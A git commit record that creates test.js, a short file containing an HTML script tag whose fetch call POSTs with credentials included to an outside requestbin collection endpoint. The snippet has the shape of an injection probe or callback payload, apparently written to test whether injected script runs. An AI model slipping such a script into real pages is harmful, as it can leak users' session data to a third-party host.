6a37a17f7f1455f0049216350246852570efe1da
BastienLedon <51904840+BastienLedon@users.noreply.github.com>
2025-03-25 11:55:29 +0100

    Create test.js

---
+++ test.js
@@ -0,0 +1,11 @@
+
+<script type="application/javascript">
+fetch('http://requestbin.whapi.cloud/1hozc3z1', {
+  method: 'POST',
+  credentials: 'include',
+})
+  .then(response => response.text())
+  .then(body => console.log(body))
+  .catch(error => console.error(error));
+
+</script>
